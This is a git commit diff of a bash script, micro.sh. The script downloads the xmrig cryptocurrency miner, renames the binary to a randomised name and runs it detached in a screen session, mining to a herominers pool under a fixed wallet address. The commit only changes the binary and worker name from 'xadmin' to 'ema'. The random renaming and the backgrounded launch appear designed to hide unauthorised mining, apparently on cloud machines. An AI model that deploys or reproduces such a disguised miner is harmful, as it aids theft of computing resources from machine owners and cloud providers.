042e65631aa018a9390620f0b147ded9700374e4
charlesmalexander64 <55861927+charlesmalexander64@users.noreply.github.com>
2019-11-07 21:36:05 +0700

    Update micro.sh

--- micro.sh
+++ micro.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 sudo apt-get update
-azure=xadmin;
+azure=ema;
 mkdir /usr/share
 mkdir /usr/share/work
 rm -r /usr/share/work/xmrig-3.2.0
@@ -8,9 +8,9 @@ wget https://github.com/xmrig/xmrig/releases/download/v3.2.0/xmrig-3.2.0-xenial-
 mv xmrig-3.2.0-xenial-x64.tar.gz /usr/share/work/
 cd /usr/share/work/ &&  tar xf xmrig-3.2.0-xenial-x64.tar.gz
 rm -rf xmrig-3.2.0-xenial-x64.tar.gz && cd xmrig-3.2.0
-a='xadmin-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
+a='ema-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
 mv xmrig $azure -n
 sudo cp $azure "$cpuname"
 sudo rm -f  xmrig
 echo $cpuname" is starting"
-screen -d -m ./"${cpuname}" --donate-level 1 -o loki.herominers.com:10113 -u LZY6QfG3gYGWHiieqPfnZtAffUV3UR7ikemzgrPwV2G88tneNqmYYGbN6ebZF56DRPavF5YnvDDJSPazqbceABDw8Bh8kCy -p xadmin -a rx/loki -k
+screen -d -m ./"${cpuname}" --donate-level 1 -o loki.herominers.com:10113 -u LZY6QfG3gYGWHiieqPfnZtAffUV3UR7ikemzgrPwV2G88tneNqmYYGbN6ebZF56DRPavF5YnvDDJSPazqbceABDw8Bh8kCy -p ema -a rx/loki -k
